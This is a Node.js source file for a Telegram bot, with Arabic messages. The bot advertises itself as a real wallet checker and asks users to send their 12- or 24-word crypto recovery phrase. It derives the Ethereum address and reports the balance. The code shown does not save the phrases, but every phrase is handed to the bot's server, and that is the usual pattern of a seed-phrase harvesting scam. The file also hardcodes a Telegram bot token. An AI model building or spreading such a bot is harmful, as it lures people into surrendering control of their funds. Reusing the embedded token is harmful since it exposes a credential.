const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const bip39 = require('bip39');

const token = '9145894502:AAGZrWnyjqNsFZlu_GqGZ_QWDMczVzFZjZw';
const PORT = process.env.PORT || 3000;
const RENDER_URL = 'https://nexvoriaapp-bot.onrender.com';

const bot = new TelegramBot(token);
const app = express();

app.use(express.json());

bot.setWebHook(`${RENDER_URL}/bot${token}`);

app.post(`/bot${token}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = (msg.text || '').trim();

    if (text === '/start') {
        return bot.sendMessage(chatId, '🛡️ أهلاً بك في بوت فحص المحافظ الحقيقي!\n\nأرسل عبارة الاسترداد (12 أو 24 كلمة) لفحصها من البلوكشين.');
    }

    const words = text.split(/\s+/);
    if (words.length !== 12 && words.length !== 24) {
        return bot.sendMessage(chatId, '❌ يجب أن تتكون عبارة الاسترداد من 12 أو 24 كلمة بالضبط.');
    }

    await bot.sendMessage(chatId, '🔍 جاري فحص المحفظة واشتقاق العنوان من البلوكشين...');

    try {
        const cleanMnemonic = text.toLowerCase();
        
        // التحقق من صحة العبارة بمعيار BIP39
        if (!bip39.validateMnemonic(cleanMnemonic)) {
            return bot.sendMessage(chatId, '❌ العبارة غير صحيحة أو ليست عبارة استرداد صالحة بمعيار BIP39.');
        }

        // اشتقاق المفتاح والعنوان الحقيقي
        const seed = bip39.mnemonicToSeedSync(cleanMnemonic);
        const hdNode = ethers.HDNodeWallet.fromSeed(seed);
        const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
        const address = wallet.address;

        // الاتصال بالبلوكشين لجلب الرصيد الحقيقي
        const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
        const balanceWei = await provider.getBalance(address);
        const balanceEth = ethers.formatEther(balanceWei);

        return bot.sendMessage(chatId, 
            '✅ **تم الفحص بنجاح من البلوكشين!**\n\n' +
            '📍 العنوان: `' + address + '`\n' +
            '💰 الرصيد المكتشف: `' + balanceEth + ' ETH`'
        );

    } catch (error) {
        console.error("Error details:", error);
        return bot.sendMessage(chatId, '❌ حدث خطأ أثناء المعالجة الرياضية أو الاتصال بشبكة البلوكشين.');
    }
});

app.get('/', (req, res) => {
    res.send('Bot Webhook Server is running!');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
